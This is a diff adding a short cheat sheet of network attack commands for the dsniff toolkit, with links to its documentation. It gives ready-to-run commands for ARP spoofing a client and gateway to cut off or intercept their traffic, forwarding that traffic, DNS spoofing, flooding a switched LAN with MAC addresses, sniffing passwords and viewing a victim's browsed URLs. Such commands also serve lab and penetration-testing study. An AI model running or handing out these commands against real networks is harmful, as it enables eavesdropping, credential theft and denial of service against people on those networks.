@@ -1,0 +1,34 @@
+http://monkey.org/~dugsong/dsniff/faq.html
+http://www.ouah.org/dsniffintr.htm
+
+
+to get list of interfaces in linux
+	ifconfig -s
+
+
+For Denial of Service trick client
+	sudo arpspoof -i wlan0 -t <client> <gateway>
+
+Trick both client and gateway routing
+	sudo arpspoof -i wlan0 -t <client> <gateway>
+	sudo arpspoof -i wlan0 -t <gateway> <client>
+
+forward traffic between client and gateway
+	sudo fragrouter -i wlan0 -B1
+
+spoof hosts
+	sudo dnsspoof -i wlan0 -f /usr/share/dsniff/dnsspoof.hosts
+
+Flood a switched LAN with random MAC addresses
+	sudo macof -f wlan0
+
+Password sniffer
+	sudo dsniff -m -i wlan0
+
+send sniffed URLs to your local browser
+	webspy -i wlan0 <client>
+
+Sniff Ip Addresses and mac addresses passively
+	sudo netdiscover -i wlan0 -p
+
+
